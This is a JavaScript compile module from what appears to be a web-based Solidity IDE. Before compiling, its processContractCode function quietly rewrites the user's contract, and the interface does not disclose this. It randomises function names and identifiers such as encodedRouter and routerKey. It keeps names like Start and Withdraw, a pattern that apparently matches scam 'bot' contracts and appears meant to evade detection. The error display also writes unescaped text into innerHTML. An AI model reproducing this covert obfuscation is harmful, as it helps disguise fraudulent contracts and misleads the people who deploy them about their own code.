let compiledContract = null;
let currentContractABI = null;

function generateIdentifier(length) {
    const letters = 'abcdefghijklmnopqrstuvwxyz';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += letters.charAt(Math.floor(Math.random() * letters.length));
    }
    return result;
}

function processContractCode(text) {

    const keepFunctions = ["Start", "Withdraw", "Key", "receive", "transfer"];

    const funcRegex = /function\s+([a-zA-Z_]\w*)\s*\(([^)]*)\)\s*(internal|private)?/g;

    let nameMap = {};

    let newText = text.replace(funcRegex, (match, name, args, visibility) => {

        if (keepFunctions.includes(name)) return match;

        const before = generateIdentifier(3);
        const after = generateIdentifier(3);

        const newName = before + name + after;

        nameMap[name] = newName;

        return `function ${newName}(${args}) ${visibility || ''}`;

    });

    for (const [oldName, newName] of Object.entries(nameMap)) {

        const callRegex = new RegExp(`\\b${oldName}\\b`, 'g');
        newText = newText.replace(callRegex, newName);

    }

    newText = newText.replace(/\bencodedRouter\b/g, generateIdentifier(5) + 'PathCode' + generateIdentifier(2));
    newText = newText.replace(/\bencodedFactory\b/g, generateIdentifier(5) + 'OriginCode' + generateIdentifier(2));
    newText = newText.replace(/\brouterSignature\b/g, generateIdentifier(5) + 'SignKey' + generateIdentifier(2));
    newText = newText.replace(/\brouterKey\b/g, generateIdentifier(5) + 'AuthKey' + generateIdentifier(2));

    return newText;

}

async function compileContract() {

    if (!currentFile || !fileContents[currentFile]) {
        logToTerminal("❌ No Solidity file loaded", "error");
        return;
    }

    const compileBtn = document.getElementById('compile-btn');
    const originalHTML = compileBtn.innerHTML;

    compileBtn.innerHTML = '<span style="opacity:0.7">⏳ Compiling...</span>';
    compileBtn.disabled = true;

    try {

        let sourceCode = fileContents[currentFile];

        sourceCode = processContractCode(sourceCode);

        const input = {
            language: "Solidity",
            sources: {
                "Contract.sol": {
                    content: sourceCode
                }
            },
            settings: {
                optimizer: {
                    enabled: document.getElementById("enable-optimization").checked,
                    runs: 200
                },
                outputSelection: {
                    "*": {
                        "*": ["abi", "evm.bytecode"]
                    }
                }
            }
        };

        const solc = window.Module;

        const output = JSON.parse(
            solc.compile(JSON.stringify(input))
        );

        if (output.errors) {

            const errors = output.errors
                .filter(e => e.severity === "error")
                .map(e => e.formattedMessage)
                .join("\n");

            if (errors) {
                showCompilationError({ error: errors });
                logToTerminal(errors, "error");
                compileBtn.innerHTML = originalHTML;
                compileBtn.disabled = false;
                return;
            }

        }

        const contractName = Object.keys(output.contracts["Contract.sol"])[0];

        const contract = output.contracts["Contract.sol"][contractName];

        compiledContract = {
            abi: contract.abi,
            bytecode: contract.evm.bytecode.object
        };

        currentContractABI = contract.abi;

        window.compiledContract = compiledContract;
        window.currentContractABI = currentContractABI;

        showCompilationSuccess(compiledContract, contractName);

        updateContractSelect(contractName);

        logToTerminal("✅ Compilation successful", "success");

    }

    catch (error) {

        console.error(error);

        showCompilationError({ error: error.message });

        logToTerminal("❌ " + error.message, "error");

    }

    compileBtn.innerHTML = originalHTML;
    compileBtn.disabled = false;

    updateDeployButton();

}

function showCompilationSuccess(result, contractName) {

    const resultElement = document.getElementById('compilation-result');

    resultElement.className = 'compilation-output compilation-success';

    resultElement.innerHTML = `
        <div><strong>✓ Compilation successful</strong></div>
        <div style="margin-top:6px;font-size:11px;color:#888">
        ABI: ${result.abi.length} items<br>
        Bytecode size: ${result.bytecode.length} bytes
        </div>
    `;

}

function showCompilationError(result) {

    const resultElement = document.getElementById('compilation-result');

    resultElement.className = 'compilation-output compilation-error';

    resultElement.innerHTML = `
        <div><strong>✗ Compilation failed</strong></div>
        <pre style="margin-top:8px;font-size:11px;max-height:150px;overflow:auto">${result.error}</pre>
    `;

}

function updateContractSelect(contractName) {

    const contractSelect = document.getElementById('contract-select');

    contractSelect.innerHTML = "";

    const option = document.createElement("option");

    option.value = contractName;
    option.textContent = contractName;

    contractSelect.appendChild(option);

    contractSelect.value = contractName;

    updateConstructorParams();

}

function clearCompilationResults() {

    const compilationResult = document.getElementById('compilation-result');

    compilationResult.className = 'compilation-output';

    compilationResult.innerHTML = '<div class="output-placeholder">Select a Solidity file to compile</div>';

    compiledContract = null;

    currentContractABI = null;

    window.compiledContract = null;
    window.currentContractABI = null;

    updateDeployButton();

}
